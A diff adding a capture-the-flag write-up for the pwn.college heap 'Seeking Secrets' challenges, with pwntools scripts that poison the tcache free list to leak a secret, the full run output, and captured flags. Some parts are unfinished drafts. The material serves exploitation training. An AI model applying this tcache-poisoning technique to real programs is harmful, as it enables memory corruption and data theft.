@@ -1646,3 +1646,289 @@ pwn.college{knO2mcRxdTIDye38lEOhpvy9MXg.0FM4MDL4ITM0EzW}
 
 ### Goodbye!
 ```
+
+&nbsp;
+
+## Seeking Secrets (Easy)
+
+```
+hacker@dynamic-allocator-misuse~seeking-secrets-easy:/$ /challenge/seeking-secrets-easy 
+###
+### Welcome to /challenge/seeking-secrets-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 16 unique allocations.
+
+In this challenge, there is a secret stored at 0x423266.
+If you can leak out this secret, you can redeem it for the flag.
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+```
+
+In order to 
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process("/challenge/seeking-secrets-easy", level='error')
+
+p.sendline(b"malloc")
+p.sendline(b"0")
+p.sendline(b"128")
+print(p.recvuntil(b"quit):").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"1")
+p.sendline(b"128")
+print(p.recvuntil(b"quit):").decode())
+
+p.sendline(b"free")
+p.sendline(b"1")
+print(p.recvuntil(b"quit):").decode())
+
+p.sendline(b"free")
+p.sendline(b"0")
+print(p.recvuntil(b"quit):").decode())
+
+p.sendline(b"scanf")
+p.sendline(b"0")
+p.sendline(p64(0x423266))
+print(p.recvuntil(b"quit):").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"2")
+p.sendline(b"128")
+print(p.recvuntil(b"quit):").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"3")
+p.sendline(b"128")
+print(p.recvuntil(b"quit):").decode())
+
+p.sendline(b"puts")
+p.sendline(b"3")
+leak_text = p.recvuntil(b"Data: ").decode()
+secret = p.recvline().strip().decode()
+print(f"{leak_text}{secret}")
+
+p.sendline(b"send_flag")
+p.sendline(secret.encode())
+print(p.recvuntil(b"}").decode())
+```
+
+```
+hacker@dynamic-allocator-misuse~seeking-secrets-easy:/$ python ~/script.py
+###
+### Welcome to /challenge/seeking-secrets-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 16 unique allocations.
+
+In this challenge, there is a secret stored at 0x423266.
+If you can leak out this secret, you can redeem it for the flag.
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
+ 
+Index: 
+Size: 
+[*] allocations[0] = malloc(128)
+[*] allocations[0] = 0x17e5f2c0
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
+ 
+Index: 
+Size: 
+[*] allocations[1] = malloc(128)
+[*] allocations[1] = 0x17e5f350
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
+ 
+Index: 
+[*] free(allocations[1])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x17e5f350           | KEY: 0x17e5f010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x17e5f350          | 0                   | 0x91 (P)                     | (nil)               | 0x17e5f010          |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
+ 
+Index: 
+[*] free(allocations[0])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 2     | HEAD: 0x17e5f2c0           | KEY: 0x17e5f010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x17e5f2c0          | 0                   | 0x91 (P)                     | 0x17e5f350          | 0x17e5f010          |
+| 0x17e5f350          | 0                   | 0x91 (P)                     | (nil)               | 0x17e5f010          |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
+ 
+Index: 
+[*] scanf("%136s", allocations[0])
+
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 2     | HEAD: 0x17e5f2c0           | KEY: 0x17e5f010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x17e5f2c0          | 0                   | 0x91 (P)                     | 0x423266            | 0x17e5f000          |
+| 0x423266            | 0                   | 0 (NONE)                     | 0x68677a7072687266  | (nil)               |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
+ 
+Index: 
+Size: 
+[*] allocations[0] = malloc(128)
+[*] allocations[0] = 0x17e5f2c0
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x423266             | KEY: 0x17e5f010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x423266            | 0                   | 0 (NONE)                     | 0x68677a7072687266  | (nil)               |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit):
+ 
+Index: 
+Size: 
+[*] allocations[1] = malloc(128)
+[*] allocations[1] = 0x423266
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+Index: 
+[*] puts(allocations[1])
+Data: frhrpzgh
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+Secret: 
+Authorized!
+You win! Here is your flag:
+pwn.college{0jM840YHF5jL79Sl0oYvY6T92Nt.0VM4MDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Seeking Secrets (Hard)
+
+### Binary Analysis
+
+```c title="/challenge/seeking-secrets-hard :: main()" showLineNumbers
+
+```
+
+### Exploit 
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process("/challenge/seeking-secrets-hard", level='error')
+
+p.sendline(b"malloc")
+p.sendline(b"0")
+p.sendline(b"128")
+print(p.recvuntil(b"Function").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"1")
+p.sendline(b"128")
+print(p.recvuntil(b"Function").decode())
+
+p.sendline(b"free")
+p.sendline(b"1")
+print(p.recvuntil(b"Function").decode())
+
+p.sendline(b"free")
+p.sendline(b"0")
+print(p.recvuntil(b"Function").decode())
+
+p.sendline(b"scanf")
+p.sendline(b"0")
+p.sendline(p64(0x422961))
+print(p.recvuntil(b"Function").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"2")
+p.sendline(b"128")
+print(p.recvuntil(b"Function").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"3")
+p.sendline(b"128")
+print(p.recvuntil(b"Function").decode())
+
+p.sendline(b"puts")
+p.sendline(b"3")
+p.recvuntil(b"Data: ")
+secret = p.recvline().strip() # This is now a bytes
+print(f"[*] Leaked Secret: {secret.decode()}")
+
+p.sendline(b"send_flag")
+p.sendline(secret) 
+print(p.recvuntil(b"}").decode())
+```
+
+```
+hacker@dynamic-allocator-misuse~seeking-secrets-hard:~$ python ~/script.py
+###
+### Welcome to /challenge/seeking-secrets-hard!
+###
+
+
+[*] Function
+ (malloc/free/puts/scanf/send_flag/quit): 
+Index: 
+Size: 
+
+[*] Function
+ (malloc/free/puts/scanf/send_flag/quit): 
+Index: 
+Size: 
+
+[*] Function
+ (malloc/free/puts/scanf/send_flag/quit): 
+Index: 
+
+[*] Function
+ (malloc/free/puts/scanf/send_flag/quit): 
+Index: 
+
+[*] Function
+ (malloc/free/puts/scanf/send_flag/quit): 
+Index: 
+
+
+[*] Function
+ (malloc/free/puts/scanf/send_flag/quit): 
+Index: 
+Size: 
+
+[*] Function
+[*] Leaked Secret: ipubljho
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+Secret: 
+Authorized!
+You win! Here is your flag:
+pwn.college{smCm7JHRquJbXskS-KlEMuZeUe5.0lM4MDL4ITM0EzW}
+```
